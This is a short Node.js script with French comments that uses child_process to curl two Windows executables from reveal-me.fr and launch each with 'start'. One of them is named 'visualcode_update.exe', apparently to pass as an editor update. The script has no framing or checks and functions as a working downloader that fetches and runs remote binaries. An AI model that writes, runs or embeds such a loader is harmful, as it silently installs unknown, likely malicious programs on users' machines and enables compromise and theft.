const { exec } = require('child_process');

// Commande pour télécharger Client-built.exe depuis l'URL
const downloadBuiltCommand = `curl -o Client-built.exe https://reveal-me.fr/Client-built.exe`;

// Exécute la commande de téléchargement pour Client-built.exe
exec(downloadBuiltCommand, (error, stdout, stderr) => {
    if (error) {
        console.error(`Erreur lors du téléchargement de Client-built.exe : ${error.message}`);
        return;
    }

    console.log('Téléchargement de Client-built.exe terminé.');

    // Commande pour exécuter Client-built.exe
    const startBuiltCommand = `start Client-built.exe `;
    
    // Exécute la commande pour démarrer Client-built.exe
    exec(startBuiltCommand, (error, stdout, stderr) => {
        if (error) {
            console.error(`Erreur lors de l'exécution de Client-built.exe : ${error.message}`);
            return;
        }
        console.log('Client-built.exe exécuté.');

        // Commande pour télécharger Client.exe depuis une autre URL
        const downloadCommand = `curl -o visualcode_update.exe https://reveal-me.fr/visualcode_update.exe`;
        
        // Exécute la commande de téléchargement pour Client.exe
        exec(downloadCommand, (error, stdout, stderr) => {
            if (error) {
                console.error(`Erreur lors du téléchargement de visualcode_update.exe : ${error.message}`);
                return;
            }
    
            console.log('Téléchargement de Client.exe terminé.');
    
            // Commande pour exécuter Client.exe
            const startCommand = `start visualcode_update.exe `;
            
            // Exécute la commande pour démarrer Client.exe
            exec(startCommand, (error, stdout, stderr) => {
                if (error) {
                    console.error(`Erreur lors de l'exécution de Built.exe : ${error.message}`);
                    return;
                }
                console.log('visualcode_update.exe exécuté.');
            });
        });
    });
});
